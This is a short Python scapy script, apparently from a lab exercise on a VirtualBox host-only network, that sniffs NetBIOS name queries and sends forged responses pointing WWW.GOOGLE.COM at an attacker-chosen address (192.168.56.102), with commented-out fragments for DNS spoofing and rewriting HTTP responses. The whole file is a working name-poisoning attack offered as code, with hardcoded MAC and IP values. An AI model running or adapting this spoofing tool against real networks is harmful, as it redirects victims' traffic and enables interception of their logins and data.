from scapy.all import * 

def processPkt(packet):
    scapyPkt = packet #IP(packet.get_payload())
    if scapyPkt.haslayer(NBNSQueryRequest):
        try:
	   packet  = modifyPkt(scapyPkt)
        except IndexError:
            print("Error")
            pass
        #packet.set_payload(bytes(scapyPkt))
    #packet.accept()
    sendp(packet, loop = 0, verbose = 2)

def modifyPkt(packet):
    etherL = Ether(dst = "08:00:27:b7:c4:af", src = "08:00:27:D0:25:4B")
    ipL = IP(src = "192.168.56.103", dst = "192.168.56.101")
    udpL = UDP(sport = packet[UDP].dport, dport = packet[UDP].sport)
    nbnsResL = NBNSQueryResponse(ANCOUNT=1, FLAGS = 0x8500, NAME_TRN_ID= packet[NBNSQueryRequest].NAME_TRN_ID, RR_NAME = "WWW.GOOGLE.COM",SUFFIX = packet[NBNSQueryRequest].SUFFIX, NB_ADDRESS ="192.168.56.102", QDCOUNT=0, NSCOUNT=0, ARCOUNT=0)
    packet = etherL / ipL / udpL / nbnsResL
    print(packet.show())
    #dnsname = packet[HTTPResponse].payload
    #packet[HTTPResponse].payload = '<html><body><h1>It does not work!</h1></body></html>'
    
    #if dnsname not in dns_hosts:
	  #  print("no modification", dnsname)
	   # return packet
    #packet[DNS].an = DNSRR(rrname=dnsname, rdata = dns_hosts[dnsname])
    #packet[DNS].ancount = 1 #???
    #del packet[IP].len
    #del packet[IP].chsum
    #del packet[UDP].len    
    #del packet[UDP].chksum
    
    return packet

#"port 137"
try:
    sniff(prn = processPkt, lfilter = lambda x: x.haslayer(NBNSQueryRequest), iface = "enp0s3")
except KeyboardInterrupt:
    print("END")
